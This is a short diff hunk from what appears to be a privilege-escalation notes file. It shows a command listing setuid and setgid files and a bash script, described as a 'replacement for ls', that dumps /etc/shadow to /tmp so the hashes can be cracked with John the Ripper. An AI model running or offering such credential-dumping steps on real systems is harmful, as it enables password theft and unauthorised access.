@@ -94,7 +94,7 @@ find / -type f perm /6000 -ls 2>/dev/null               #Find both
 
 #Replacement for ls command to get /etc/shadow and a word list to john the ripper for passwords
         #this script gives working results
-
+        #have a copy in /var/tmp along with /tmp to work
 #!/bin/bash
 
 sudo cat /etc/shadow > /tmp/no_work.txt
